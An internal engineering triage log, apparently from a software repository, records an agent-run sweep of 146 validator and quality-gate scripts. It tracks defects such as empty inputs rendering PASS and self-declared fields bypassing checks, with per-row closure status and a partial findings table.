# Evidence-Surface Triage Sweep — The Never-Examined 146
Date: 2026-07-28
Status: first-look triage complete. **109 leads survived adversarial refutation**
over 146 proof surfaces that no prior hunt had ever examined on this axis. A
SAMPLE was parent-reproduced; the rest are recorded at the provenance the sweep
actually produced. This is a hot list to work, not a closed defect ledger.
**36 rows are now CLOSED** — S6, S19, S20, S93, then S27/S29/S33/S34 on 2026-07-28, then
S14/S16/S17/S18/S25/S39/S40/S42/S43/S44/S46/S49/S53/S56 on 2026-07-30, then
S3/S4/S5/S7/S11/S21/S22 on 2026-07-31, then S1/S26/S30/S32 on 2026-08-01, then S28, S13 and S23 on
2026-08-01 — reproduced in the parent, fixed, and regression-tested. **Count corrected
2026-08-01:** the header asserted 29 while the table carried 33 rows whose status began
CLOSED. The four the enumeration omitted are **S5, S7, S21 and S22**, all
`CLOSED (parent-reproduced 2026-07-31)` in the table and absent from the 2026-07-31
group, which listed only S4 and S11. (A first draft of this note said "seven where the
table shows two", which does not reconcile: 29 + 4 = 33.) The count is now derived from
the table, not maintained beside it.
**What the S1/S26/S30/S32 batch does NOT close.** All four were one class — a denominator
that reached zero rendering a PASS — and all four were reproduced in the parent with a
control before repair. **S31 is NARROWED, not closed**: this repo's own two workflows both
self-exempt, so the parity gate evaluates zero jobs here, and the batch made that legible
(`workflows_not_exempt`, `jobs_evaluated`, a NOTE line, an opt-in `--require-evaluated-scope`
that is deliberately NOT wired into `run-quality.sh`, and a test pinning the posture). The
self-declaration defect S31 names — the exemption is granted by a comment INSIDE the file
being audited — is untouched; whether to arm the refusal is [D45](../../docs/deferred-decisions.md).
Round 1 found the first cut of the S26 repair still dropping a job-level `jobs.<id>.uses:`
reusable-workflow call, and a comment that had declared that drop correct; round 1 also
found the S1 repair keying on the input length, so an all-exempt or all-unmeasured
population kept the same green one bucket over. Both are repaired; the round-2 repairs are
accepted-unreviewed under the two-round cap.
**What the 2026-08-01 S24/S28/S35 batch does and does NOT close.** All three were one
class — an absent or unreadable input rendering the same verdict as a matching one — and
all three were reproduced in the parent with a control before repair. Two review rounds
ran, three reviewers then two; **the round that read the REPAIRS found five blockers the
first round could not see, three of them created BY round 1's repairs**: a document-marker
skip that merged a second YAML document's items into the first document's list (changing
what `load_yaml` returns), an `absent_surfaces` field still built from the `None` test it
was introduced to replace, and a typed-refusal guard added to one loader while the loader
serving nine skills kept dying on a traceback. Round-2 repairs ship **accepted-unreviewed**
under the two-round cap.

- **S24 — NARROWED, not closed.** `adapter_lib` now REPORTS the lines its parser could not
  interpret (four drop sites, `load_yaml_report`), the issue adapter and the shared
  nine-skill `load_adapter_contract` surface them, and an unsupported construct returns a
  typed `valid: false` instead of a traceback. The row's reproduced verdict is
  **unchanged**: `valid: true`, `errors: []`, exit 0, `default_org` still silently serving
  the inferred `corca-ai`. Arming the refusal is [D46](../../docs/deferred-decisions.md) —
  the file is consumer-authored, so refusing it turns a consumer's issue lane red for a
  typo, and the measurement that would authorize arming
  ([0 over 44 files](../probe/2026-08-01-adapter-yaml-uninterpreted.json)) covers this
  repo's corpus, not the consumer-authored population the refusal would judge. Nothing
  consumes the new warning yet. A legal 4-space indent step still records
  `over-indented line`, so "malformed" and "unsupported-by-this-parser" are not separated.
- **S28 — CLOSED.** A present-but-unreadable baseline no longer takes the first-time
  bootstrap path: `write_baseline` returns `existing-baseline-unreadable` and leaves the
  file byte-identical, while a genuinely absent baseline still bootstraps. It is a
  confirmation gate, not a refusal — and `--confirm-baseline-delta` still authorizes all
  three of its facts (empty scan, unreadable baseline, large delta) with one flag; only
  the success message now records which one it covered. **Control:** `write_baseline` over
  a truncated baseline with `--baseline-delta-threshold 5`, no `--confirm-baseline-delta`,
  and 50 live families; pre-repair verdict `{ok: true, status: "baseline-written",
  code_family_count: 50}` with the damaged baseline overwritten. **Pinned by**
  `tests/quality_gates/test_absent_input_is_not_a_matching_input.py::test_s28_a_truncated_baseline_is_refused_not_overwritten`.
- **S35 — NARROWED, not closed.** Absence is legible (`absent_surfaces`, and `<absent>` /
  `<unreadable>` / `<no-version>` distinguished), the packaging manifest's own absence is
  drift instead of `drift: []`, an unreadable `plugin.json` no longer crashes the check,
  and a DECLARED absent surface becomes drift. But drift-on-absence is armed by a
  self-authored `required_release_surfaces` that defaults to empty, so for any consumer the
  row's verdict is unchanged — **the repair is an instance of the class this sweep
  catalogues**, the same self-declaration shape S31 records as OPEN. Its one defense is
  that the declaration lives in the adapter rather than in the audited file, which is the
  channel D45 names as S31's correct repair. Deleting those four lines disarms it with
  nothing corroborating them. Arming question filed as
  [D48](../../docs/deferred-decisions.md).

**What the 2026-08-01 S9/S10/S12/S13 batch does and does NOT close.** One class — what the
audited content says about itself is not proof — across two files, both reproduced in the
parent with controls. Two rounds, four reviewers. **Round 2 again found defects created by
round 1's own repairs**, and one of them is this sweep's own class committed by the repair:
a code comment defending the floor asserted "raising it to 20 still refuses zero", which
the slice's own recorded probe and its own test refute. Round-2 repairs ship
**accepted-unreviewed** under the two-round cap.

- **S9 — NARROWED, not closed.** The `Date:` line no longer decides alone: `commit_state`
  refuses a backdated artifact that is uncommitted, dirty, or last-committed on or after
  the contract start. Must admit: `%cs` is the COMMITTER date and `GIT_COMMITTER_DATE`
  forges it — this is a different channel, not an unforgeable one, and the repo's own test
  fakes a 2020 commit exactly that way. A shallow (`fetch-depth: 1`) checkout would flip
  frozen artifacts to false refusals, so this must not join a CI job without
  `fetch-depth: 0`. **Zero** checked-in artifacts claim the exemption, so the corroboration
  arm is exercised by no real content; its only evidence is the regression tests.
- **S10 — NARROWED, not closed.** A field mention and a `Label:` value must now carry ≥5
  alphanumerics beyond every declared field name and every stub token, so the five `n/a`
  stubs are refused — including the quoted, em-dashed, multi-word and
  bare-field-enumeration shapes the first cut let through. Must admit: an explicit
  negation still counts as engagement (scores 18), which is S11's class; and a field whose
  NAME is an ordinary English word (`scope`, `ranking`, `excludes`, `notes`) is still
  engaged by incidental prose — the value-marker rule that would refuse the sampled cases
  costs 5 checked-in reviews and is deferred as [D47](../../docs/deferred-decisions.md).
- **S12 — NARROWED, and THE ROW ITSELF IS CORRECTED.** The row claims "any PR number,
  runbook step number, or heading anchor" marks a delegated proof RESOLVED. That is false
  for two of its three examples: `_ISSUE_REF` matches only `#<digits>` and `issue <digits>`,
  so `see runbook step 3` never resolved, and the row's recorded `unresolved_items == []`
  could not have held for its own second item. What the repair closes is narrower still —
  a reference plus a self-declared not-done. **A bare `- live proof — #412` with no
  negation still resolves, so the headline class (a pointer is not the proof) is
  untouched.**
- **S13 — CLOSED.** A present `## Closeout Delegation` with an absent or blank
  `Closeout mode:` is `undeclared` and refused; absence of the SECTION still means
  standalone. Round 2 caught the first repair writing its reason to a key no consumer
  reads, which left `describe_goal_closeout_shape` rendering the refused floor as
  SATISFIED. Zero checked-in goal artifacts declare the section, so the floor costs
  nothing here and is unexercised by real content. **Control:** a `## Closeout Delegation`
  section listing `- final push/CI green` and `- provider live proof` with no
  `Closeout mode:` line; pre-repair verdict `mode='standalone'`, `declared=True`, `ok`
  never set. **Pinned by**
  `tests/quality_gates/test_a_declaration_is_not_its_own_corroboration.py::test_s13_a_declared_section_with_no_mode_line_is_refused`.

**What the 2026-08-01 S23/S2 batch does and does NOT close.** Two singletons sharing no
code. **The plan predicted S23 would be REFUTED and the prediction was wrong** — the
reproduction refuted the refutation, which is the whole reason the rule is reproduce
before repairing.

- **S23 — CLOSED, and the ROW's surface:line was wrong while its verdict was right.** The
  row pointed at the pre-repair confirmation construction, which does carry an
  `if ok else None` guard introduced 2026-07-20, before this sweep — the basis for the REFUTE prediction
  that both the plan and a round-1 reviewer reached. But the guard runs BEFORE
  `_fold_proof_mismatch`, which flips `ok` to False and `status` to `failed` afterward and
  never touched the sentence. `sync_confirmation_line` now enforces that a refused verdict
  carries no rendered line, one direction only. Round 1 found the same class open ONE
  LEVEL UP: `release_issue_closeout_message` performs a second post-hoc flip on the same
  payload, also repaired. **Control:** a pre-fold result with every check passed, folded
  against a `## Proof Ledger` row with an unsatisfied acceptance and an empty disposition;
  pre-repair verdict `ok: False, status: failed` with
  `confirmation.line: "carrier-checked: issue_verify_closeout@gh via carrier-body-checks
  (carrier-checks-only)"`. **Pinned by**
  `tests/quality_gates/test_a_refused_verdict_states_its_refusal.py::test_s23_a_refused_verdict_drops_its_confirmation_line`.
- **S2 — NARROWED, not closed.** A single-backtick span still open at end of input is now
  reported instead of dropped, so a stray backtick can no longer shift the pairing and let
  a genuinely wrapped span render clean. Must admit: **the reported line is the LEFTOVER
  backtick, not the opener of the wrapped span**, so the finding says "audit the pairing"
  rather than naming the real span — correct pairing needs a stack this repair does not
  add. And the misdirection is NOT confined to the new class: once the pairing is
  shifted, the WRAPPED branch can also name a line with no wrap on it (a stray backtick
  on its own line pairs with the real opener, and the wrap is reported at the stray). `_strip_fences` handles fenced blocks only, so a lone backtick inside a blockquote
  or a 4-space indented block is a new false-positive vector the old drop-the-leftover
  behavior absorbed silently. And the measured zero is **not** a safety argument:
  `check-markdown.sh` treats this checker as ADVISORY and exits with markdownlint's status
  alone, so nothing here can block a commit — the zero means the new class adds no noise.
  **Non-claim on that zero:** unlike S24's and S10's numbers it is a HAND measurement with
  no checked-in script and no recorded probe, so it is not re-runnable; and the second
  in-repo consumer of this checker, `check_doc_authoring_preflight`, applies no
  `EXCLUDE_PARTS`, so the zero bounds the CLI's scope only. **Control:** a stray backtick
  before a genuinely wrapped cross-line span; pre-repair verdict
  `find_wrapped_inline_code` returned `[]`, i.e. exit 0 over a real wrap. **Pinned by**
  `tests/quality_gates/test_a_refused_verdict_states_its_refusal.py::test_s2_a_stray_backtick_no_longer_masks_a_real_cross_line_span`.

**What S11's floor does NOT prove, recorded because two review rounds kept finding the
gap wider than the previous claim:** it proves the section names an unnegated English
review word or cites a path-shaped token — never that a reviewer ran. `executed —
foundational sweep` passes on `found` inside `foundational`; the language-neutral arm
takes ANY backticked slash-and-extension token or markdown link and checks neither that
the file exists nor that it is the review's record. The contradiction arm is anchored on
the verb (`no bounded reviewer ran`), because adjacency cannot separate a denied event
from a negative RESULT — `no reviewer identified a blocker` is honest checked-in text and
stays legal — so a denial phrased any other way is not caught. Its incentive gradient
points the wrong way: it fires on the author honest enough to write that nothing ran, and
clears the vague one. `declared_delegated_review_status` reads the earliest status token
on the first status-bearing line, so a section opening `not_applicable for X; executed for
Y` skips the floor entirely, and the sibling `slow_gate_scope` branch still keys on the
bare substring `executed` — left unnarrowed so this slice could not weaken an existing
rule. The one channel that could actually substantiate an executed review —
`reviewer_boundary_fingerprint.py` snapshot/verify output, or the reviewer's returned
text — is not consulted; that is the next slice, not this one. Round-2 repairs (comment
stripping over joined text, the verb-anchored denial arm, negation-aware substantiation,
the path-shape requirement) are **accepted-unreviewed** under the two-round cap. **S3 — CLOSED 2026-08-01; the PARTIAL statement it replaced is kept below because
the reasoning still bounds what the closure does and does not claim.** S3 was
its stale-unrelated-artifact half is closed by the same binding fix as S4 (evidence now
binds inside `check()`), but its stub half is OPEN: two byte floors were written and
withdrawn — a basename-only floor left the cheaper CONTENT channel open (`printf '#466' >
x.md` is four bytes and binds), and a universal one was defeated by filler while failing
34 existing tests. What separates a stub from an artifact is per-kind SHAPE, and no shape
check runs on this gate's accept path. **Closed 2026-08-01.** Not with a byte floor and not with the per-kind shape check
that was planned: a markdown-shape floor was measured and rejected (22 of 2168 real
artifacts carry no headings, all commit-message drafts, so it sits above how this
repo writes its own evidence). The rule that worked is narrower — evidence must say
something BEYOND the identity it was checked against. Measured by a checked-in
script ([measure_evidence_residual.py](../../scripts/measure_evidence_residual.py),
run recorded at
[the residual-floor probe](../probe/2026-08-01-evidence-residual-floor.json)):
the stub scores 0, markdown artifacts floor at 337 over 2168 files, JSON host-log
probes at 530 over 83. The floor sits at 8. The xfail is gone, replaced by real
refusal assertions. What stays open is written down rather than implied: a few
characters of filler still passes, so this refuses a stub, not a lie. The 2026-07-31
[S3/S4 critique](../critique/2026-07-31-sweep-s3-s4-closeout-evidence-binding.md)
is the record of the PARTIAL state and records the stub half as OPEN; it predates
this closure and is cited for that reasoning, not as review evidence for the fix.
The fix's own two review rounds are in
[the slice-2 critique](../critique/2026-08-01-slice-2-s3-stub-half.md).
**Found while closing S4 and NOT repaired — no row of its own, recorded here so it is
not held only in a critique:** a bare issue token boundary-matches an interior version
segment, so token `1` binds the checked-in
`charness-artifacts/critique/v1-0-1-retired-hook-ledger-packet.md`. Verified present at
HEAD *before* the 2026-07-31 slice, so it is not a regression from it. It is a
false-acceptance at the issue-closeout boundary and wants its own slice. Three further
token residuals affect CONSUMING repos only, none of them this repo's current versioning:
a CalVer release version boundary-matches any artifact's `Date:` header; a two-component
version like `1.2` binds prose ("section 1.2"); and a pre-release such as `2.12.0-rc.1`
contains letters, so it falls out of cluster matching back to substring containment.

**S15 is PARTIAL:** the pre-rule scope verdict now
discloses its basis (`evaluated`, `created`, `rule_date`), but the self-declared `Created:`
line still decides whether the floor runs, because forcing it in scope was MEASURED to
refuse 82 of 82 pre-rule goals and the one in-text corroboration channel (the goal's own
filename date) legitimately disagrees with `Created:` in a real checked-in goal.

The 2026-07-30 batch found three defects in its OWN first cut, all caught by round-2
bounded review reading the repaired surfaces: masking every balanced fence region and
returning only the unclosed tail raw made ONE stray marker re-pair every later fence and
hide real sections (a false "missing sections" refusal), so `mask_fences` keeps failing
open and `fences_balanced` now makes the imbalance readable instead; the S18 fence repair
dropped a real `- Risk Class: external-seam` behind an unclosed fence into the legacy
"artifact has no risk line" carve-out and emitted a silent continue, which is the S18
defect statement verbatim; and the new `Activation:` shape check refused bold and
blockquoted lines with a message asserting the line was missing. Every other row is still open at the
provenance its own cell states — in the MAIN findings table. S4's wrong output was
reproduced in the parent before the fix (an unrelated 2026-07-27 critique satisfied an
`issue-resolution` closeout through the generic CLI), and S3's stale-artifact half with
it. The reviewer-derived leads
table at the end of this file has its own statuses (see the vocabulary block below);
twelve of its rows are `REPAIRED` and one is `DISPOSITIONED`, so "every other row is
still open" is a claim about the main table only.

The S27/S29/S33/S34 batch also produced **14 new leads** across two review rounds of that
one fix; they are recorded at the end under
[Leads found while closing S27/S29/S33/S34](#leads-found-while-closing-s27s29s33s34) and
are REVIEWER-DERIVED, not parent-reproduced. Twelve were repaired inside the same slice; R8 was
refuted at HEAD on 2026-07-30 and R9 was dispositioned as an accepted residual by the
operator on 2026-07-28. Round 2 reviewed the round-1 REPAIRS and found the class
again in four more places, which is the number worth remembering about this class.

## Why this exists

The [2026-07-27 hunt](./2026-07-27-evidence-surface-bug-hunt.md) found 30 defects
and named 22 distinct surfaces. This repo has 355 files in the proof-surface
families, so that hunt examined **6% of the corpus** — and its own record says it
"was wired into nothing". The operator chose a finite burn-down: triage every
never-examined verdict-rendering surface once, cheaply, to find out where the
defects are before spending deep tokens.

The class hunted is unchanged — *a proof surface reports a verdict over a scope it
did not establish* — with two classes this repo has since confirmed and added:
(g) fenced/quoted text read as the author's own assertion, and (h) a self-declared
field deciding whether the surface's own floors run.

## Method, and what it cost

A dynamic workflow: 5 scan agents over 5 shards (~29 surfaces each), each
**with a shell** and instructed that an executed finding is worth ten reasoned
ones; then one adversarial refutation agent per shard whose default was that every
claim is wrong; then a ranking pass. 11 agents, 1.52M subagent tokens, 700 tool
calls, 24 minutes wall clock.

The refutation pass killed **34 of 143** raw leads (24%), which is the number that
makes the remainder worth reading.

## Status vocabulary

- **`NARROWED (<date>)`** — reproduced in the parent and partially repaired, with the
  residual written onto the row itself. It is **not done**: `CLOSED` remains the only
  status that means a row needs nothing further. Introduced 2026-08-01, when five rows
  turned out to have repairs that close part of the claim and leave a named part open., and the honest scope

- `PARENT-CONFIRMED` — the parent re-ran it in this session and saw the wrong
  output. **Four surfaces.** Everything else is not this.
- `SUBAGENT-CONFIRMED` — the scanning agent reports it executed the code and
  observed the wrong output, and the refutation agent did not overturn it. This is
  stronger than the prior hunt's leads (those reviewers had no shell) and weaker
  than parent confirmation. **Not to be cited as proof without re-running.**
- `LEAD` — reasoned from code only.
- `CLOSED (parent-reproduced <date>)` — the parent reproduced the wrong output, fixed
  it, and left a regression test that fails on reverting the fix. This is the only
  status that means a row is done; nothing else in this table does, whatever a test
  docstring elsewhere claims.

The reviewer-derived leads table at the end of this file adds three statuses of its own,
and none of them is `CLOSED`:

- `REPAIRED (same slice)` / `REPAIRED (round 2)` — fixed and regression-tested inside the
  slice that surfaced it. It is NOT `CLOSED`: the row was read from source by a reviewer,
  never reproduced by the parent as its own defect, so the repair rests on the reviewer's
  reading plus a test written from it.
- `DISPOSITIONED (accepted residual <date>)` — the operator decided the named residual is
  the correct cost of avoiding a worse failure, and the decision plus what stays unguarded
  is recorded on the owning surface. It means "do not work this", NOT "this is fixed".
  Reopen only with evidence that the residual is reachable by a path the decision did not
  consider.
- `OPEN` — surviving lead, unworked.
- `REFUTED (design posture, <date>)` — the row described intended behavior, not a
  defect, and the reading that made it look like one was wrong. Added 2026-07-31
  for S8: `skills/public/quality/references/cautilus-on-demand.md:21` makes
  deterministic validators the owner of prompt-affecting diffs, `run-quality.sh`
  runs the validator over the live diff with no `--paths`, and
  `tests/test_cautilus_proof_artifact.py:12` pins the exit-0 behavior — so the
  "repair" would have turned the lane red for every future SKILL.md commit. The
  residual (an EXISTING proof artifact going stale relative to a later prompt
  change) is a different class; the operator decided on 2026-07-31 to open it as
  its own row, **S110**, at `LEAD` — reasoned from source, not reproduced.

**What is NOT claimed:** that 109 defects exist. That is the count of surviving
claims, not of reproduced defects. The prior hunt's discipline was that
confirmation is the parent's execution with a discriminating control alongside;
this sweep deliberately traded that for breadth, and the trade is recorded here
rather than hidden in a confident number. Work a row by reproducing it first.

**25 surfaces were reported clean** by their scanner and are listed at the end —
"clean" here means one lens set, one pass, one agent, and it is a scope statement,
not a verdict.

## Totals

| | |
|---|---|
| surfaces examined | 146 |
| raw leads | 143 |
| refuted by the adversarial pass | 34 |
| **survived** | **109** |
| self-reported as executed (`SUBAGENT-CONFIRMED`) | 78 |
| high / medium / low | 37 / 56 / 16 |
| reported clean | 25 |

By class: (a) 34, (b) 19, (c) 19, (d) 12, (e) 3, (f) 10, (g) 4, (h) 8

Class (a) — *empty or degenerate input still returns PASS* — is a third of the
survivors, the same dominant shape the first hunt found. The negative space is
where this repo's proof surfaces keep failing.

Every number above describes the 2026-07-28 sweep RUN and is frozen at that run.
The findings table has since gained four rows — S110 (opened 2026-07-31 by
operator decision out of S8's refutation) and S111-S113 (found while working the
2026-08-01 stragglers goal) — which is why the table's row count exceeds
`survived`. A later row is not a later survivor of this run's refutation pass.

## Findings

| id | sev | provenance | class | surface:line | trigger | wrong output |
| --- | --- | --- | --- | --- | --- | --- |
| S1 | high | CLOSED (parent-reproduced 2026-08-01) | f | `scripts/check_coverage_lib.py:78` | `build_per_file_floor_report([])` — an empty file list, i.e. a coverage JSON read with the wrong key, a scope filter that matched nothing, or a failed coverage run. | `{"status": "enforced", "violations": [], "warn_band": [], "exempt_below_floor": [], "unmeasured": []}` — a fully green, self-declared-'enforced' per-file floor report over a popul |
| S2 | high | NARROWED (2026-08-01, not closed) | b | `scripts/check_markdown_inline_code.py:67` | A markdown line carrying one stray/unmatched backtick before a genuinely wrapped span, e.g. `A stray backtick don\`t worry, then \`python3 foo.py` / newline / `--bar\` ends the spa | Ran it: `Validated inline code spans in 1 markdown file(s).` exit 0 — a real cross-line inline-code span is reported clean. In a milder variant (/tmp/w2.md) the violation fires but |
| S3 | high | CLOSED (parent-reproduced 2026-07-31; stub half closed 2026-08-01) | b | `scripts/check_prescribed_skill_executed_lib.py:211` | printf 'x' > charness-artifacts/critique/one-byte.md; python3 scripts/check_prescribed_skill_executed.py --repo-root /tmp/t3 --require standalone_critique --evidence standalone_cri | ok:true, exit 0. The verdict is keyed on `resolved.stat().st_size == 0` — a coarse field. A 1-byte file, or a 2019 unrelated critique, satisfies the mandatory closeout critique gat |
| S4 | high | CLOSED (parent-reproduced 2026-07-31) | e | `scripts/check_prescribed_skill_executed_lib.py:81` | `evidence_binds_to_context` (the #233 F1 backstop) is defined here but `check()` never calls it. grep shows only skills/public/issue/scripts/issue_resolution_critique.py:110 and sk | The binding check lives only in the copies the achieve/issue callers chose. The RELEASE publish gate and the generic CLI carry no binding check at all: a stale, unrelated charness- |
| S5 | high | CLOSED (parent-reproduced 2026-07-31) | c | `scripts/check_skill_surface_preflight.py:152` | A SKILL.md containing TWO `## Closeout Vocabulary` H2 blocks. `_remove_pressure_exempt_sections` (line 109) exempts EVERY section with that heading from the core_nonempty density c | Ran it: 60 lines of multi-sentence prose under a second `## Closeout Vocabulary` gives `core_nonempty == 4` and `vocab findings == 0`. The exemption and its anti-abuse read differe |
| S6 | high | CLOSED (parent-reproduced 2026-07-28) | a | `scripts/check_test_completeness.py:50` | `check_test_completeness.py --repo-root /tmp/ct -- ""` — one empty-string target. run-quality.sh:48-49 builds the target array with `mapfile` from `run_standing_pytest.py --print-e | exit 0. `repo_root / ""` resolves to the repo root, so relative_test_files rglobs the WHOLE repo and every test file is 'covered by standing targets'. The gate reports full complet |
| S7 | high | CLOSED (parent-reproduced 2026-07-31) | c | `scripts/validate_cautilus_diagnostics.py:76` | A cautilus bundle directory containing neither `finding.md` nor any of `observed.v1.json`/`summary.v1.json`/`report.json` — e.g. charness-artifacts/cautilus/2026-07-28-run/{notes.m | Ran both arms: `no changed cautilus diagnostic bundles` exit 0 for `--paths ...` AND for `--all`. The floors `must include finding.md` (line 179) and `must include one machine evid |
| S8 | high | REFUTED (design posture, 2026-07-31) | c | `scripts/validate_cautilus_proof.py:200` | `validate_cautilus_proof.py --paths skills/public/quality/SKILL.md` — a prompt-affecting surface changed, proof artifact untouched. | exit 0 with the reassuring `no live cautilus proof artifact changed; deterministic validation owns 1 prompt-affecting path(s)`. Every downstream floor (behavior source, commands ru |
| S9 | high | NARROWED (2026-08-01, not closed) | h | `scripts/validate_inventory_consumption.py:117` | The same quality artifact, once with `Date: 2026-07-28` and once with `Date: 2020-01-01` (a self-declared line inside the artifact the validator is judging). | Backdated: exit 0, `predates contract start; skipped.` Same file dated today: exit 1 with SIX distinct floor violations (0-of-14 field engagement, missing prose_review_status, Targ |
| S10 | high | NARROWED (2026-08-01, not closed) | b | `scripts/validate_inventory_consumption.py:146` | Artifact body containing `- I did not read scope_status or finding_status at all.` plus five stub lines `Target boundary: n/a`, `Ambient repo findings: n/a`, `prose review result:  | `Validated inventory consumption for 1 declared inventory citation(s)`, exit 0. 'Engagement' is `\b<field>\b` presence, so an explicit negation and five `n/a` stubs satisfy the con |
| S11 | high | CLOSED (parent-reproduced 2026-07-31) | b | `scripts/validate_quality_artifact.py:232` | `## Delegated Review` section containing only the line `- status: executed (no reviewer, no findings, nothing ran)`. | validate_delegated_review_section PASSES. The verdict keys on the substring `executed` anywhere in the section; only `blocked` must cite a host/tool signal. The repo's fresh-eye-su |
| S12 | high | NARROWED (2026-08-01, row CORRECTED — the trigger and wrong-output cells below are REFUTED; see the batch note) | b | `skills/public/achieve/scripts/goal_artifact_closeout_delegation.py:119` | An orchestrator goal whose `Delegated proof checklist:` items are `- push to CI and confirm green for PR #412 — NOT DONE, still pending` and `- instance apply/restart — see runbook | Ran it: `unresolved_items == []`, `report["ok"]` stays True. Any PR number, runbook step number, or heading anchor in the item text marks a delegated external proof as RESOLVED. Th |
| S13 | high | CLOSED (parent-reproduced 2026-08-01) | h | `skills/public/achieve/scripts/goal_artifact_closeout_delegation.py:159` | A goal artifact with a `## Closeout Delegation` section listing `Delegated proof:` items but with the `Closeout mode:` line absent, or present-and-blank. `mode_tokens` is empty so  | Ran both shapes: `ok=True`, `mode='standalone'`, `delegated_items=['final push/CI green','provider live proof']` with zero failures. A goal that visibly delegates external proof is |
| S14 | high | CLOSED (parent-reproduced 2026-07-30) | h | `skills/public/achieve/scripts/goal_artifact_disposition.py:255` | A goal body that quotes another artifact's date line before its own, e.g. a blockquote `> Created: 2025-01-02` above the real `Created: 2026-07-01`. `parse_created_date` (goal_arti | Ran it: `parse_created_date` returns 2025-01-02 and `is_floor_in_scope(..., 2026-06-08)` returns False. Every Created-gated floor at once (disposition form 1c, recurrence lineage 1 |
| S15 | high | PARTIAL (2026-07-30) | h | `skills/public/achieve/scripts/goal_artifact_operator_queue.py:40` | Goal artifact text with 'Created: 2020-01-01' and 'Status: complete' and no ## Operator Decision Queue section at all → check(text) | {'applies': False, 'ok': True, 'reason': 'pre-rule goal'}. A single author-written Created: line decides whether the complete-state floor runs. The grammar docstring claims 'a goal |
| S16 | high | CLOSED (parent-reproduced 2026-07-30) | g | `skills/public/achieve/scripts/goal_artifact_operator_queue.py:53` | Goal with Created: 2026-07-01 and a '## Operator Decision Queue' section whose only content is a fenced block containing '- Decision: this is only an EXAMPLE inside a fence'. _sect | {'applies': True, 'ok': True, 'reason': 'queue disposition recorded'}. A quoted/illustrative example inside a code fence is read as the author's real operator decision, satisfying  |
| S17 | high | CLOSED (parent-reproduced 2026-07-30) | g | `skills/public/achieve/scripts/goal_artifact_phase_routing.py:50` | A goal artifact containing an earlier fenced template example with `Created: 2020-01-01`, plus any unbalanced/unclosed fence later in the file. `goal_artifact_markdown.mask_fences` | Ran it: `parse_created_date` returns 2020-01-01 instead of the real 2026-07-20; `in_scope=False`, `triggered=False`, `report['ok']` stays True even though `## Slice Log` records `W |
| S18 | high | CLOSED (parent-reproduced 2026-07-30) | g | `skills/public/debug/scripts/plan_debug_run.py:59` | A debug artifact that quotes the template inside a fenced block (```\n- Risk Class: none\n- Generalization Pressure: none\n```) above its real `## Seam Risk` section declaring `- R | Ran it: risk_classes ['none'], generalization_pressure 'none', requires_interrupt False, mode `continue-existing-artifact`, ok True. The forced risk interrupt (document-seams.md +  |
| S19 | high | CLOSED (parent-reproduced 2026-07-28) | a | `skills/public/gather/scripts/write_record.py:111` | printf '' \| python3 skills/public/gather/scripts/write_record.py --repo-root /tmp/t5 --slug empty-record --execute (empty stdin; _read_content returns '' and is never checked for  | Writes a 0-byte dated record AND overwrites the current pointer latest.md with 0 bytes, reporting {"status": "updated", "wrote_record": true} and exit 0. A durable gather artifact  |
| S20 | high | CLOSED (parent-reproduced 2026-07-28) | a | `skills/public/handoff/scripts/draft_goal_from_chunk.py:158` | `--chunk` payload `{"entries": [], "label": "", "objective_summary": ""}` — a chunk with zero sources and no objective. | `{"ok": true, ..., "status": "draft"}`, exit 0, and a goal artifact written with the title `# Achieve Goal: ` and an empty `## Goal` section. `check_goal` — the gate the docstring  |
| S21 | high | CLOSED (parent-reproduced 2026-07-31) | c | `skills/public/hitl/scripts/check_chunk_contract.py:44` | printf '' \| python3 skills/public/hitl/scripts/check_chunk_contract.py (also '   \n\n'). The underlying scripts/hitl_review_artifact_lib.py:169 short-circuits `if not asks_for_dec | {"status": "pass", "errors": []}, exit 0. An EMPTY chunk is certified as contract-satisfying. Worse in the normal case: any chunk that asks a human to decide without a '?' or the e |
| S22 | high | CLOSED (parent-reproduced 2026-07-31) | c | `skills/public/issue/scripts/audit_brief.py:80` | A transcript whose fix-unit records mutation and close events but no `classification` event: {"events":[{"kind":"mutation","issue":143,"tool":"Edit"},{"kind":"close","issue":143}]} | Ran it: `audit ok: 1 fix-unit(s) checked` exit 0. The brief-before-mutation contract is voided by omitting the one event that arms it — omission is rewarded over declaration. Same  |
| S23 | high | CLOSED (parent-reproduced 2026-08-01; the row's `surface:line` was WRONG — see the batch note) | d | `skills/public/issue/scripts/issue_verify_closeout.py:63` (the fold; the row originally pointed at the pre-repair confirmation construction, now `:317`) | A carrier body that passes every pre-fold check but declares a `## Proof Ledger` row with an unsatisfied acceptance class and an empty disposition. `confirmation` is built at lines | Ran it: `ok: False, status: failed` while `confirmation.line == "carrier-checked: issue_verify_closeout@gh via carrier-body-checks (carrier-checks-only)"`. The code comment says do |
| S24 | high | NARROWED (2026-08-01, not closed) | d | `skills/public/issue/scripts/resolve_adapter.py:226` | /tmp/t2/.agents/issue-adapter.yaml containing `default_org corca-typo` (missing colon), or a top-level YAML list instead of a mapping. Ran: python3 skills/public/issue/scripts/reso | "valid": true, "errors": [], "warnings": [] and exit 0. The malformed line is silently dropped and default_org silently falls back to the hardcoded "corca-ai". The `Adapter file di |
| S25 | high | CLOSED (parent-reproduced 2026-07-30) | d | `skills/public/quality/scripts/changed_line_coverage_gate_lib.py:145` | run_gate(Path('.'), {'eligible_globs':['**/*.py'],'coverage_json':'cov.json'}, base_sha='deadbeef...'(unknown sha), head_sha='HEAD', ...). _git_lines swallows the non-zero git exit | {'ok': True, 'reason': 'no eligible changed files in this range'} — the classify callback (which would have returned blocking rows) is never invoked. A git failure is reported as ' |
| S26 | high | CLOSED (parent-reproduced 2026-08-01) | c | `skills/public/quality/scripts/ci_local_gate_parity_lib.py:244` | A workflow job whose steps are all `uses:` (e.g. `- uses: actions/checkout@v4` then `- uses: ./.github/actions/run-everything`). Guard: `if not steps or all(not isinstance(step.get | render_report → {'workflows_scanned': 1, 'parity_issues': [], 'jobs_without_canonical_gate': []}. The backstop that should have flagged 'this job never invokes the canonical local  |
| S27 | high | CLOSED (parent-reproduced 2026-07-28) | a | `skills/public/quality/scripts/draft_dup_ratchet_triage.py:68` | A hard-blocked clone family whose inventory record carries no `sample_locations` (e.g. a nose payload where locations were truncated or the family came from a --summary view). _mem | ('intentional', 'portable per-skill adapter/bootstrap copies are expected') and draft_dup_review_entry class "intentional" — for a 9-member, 400-shared-line family. Applying the dr |
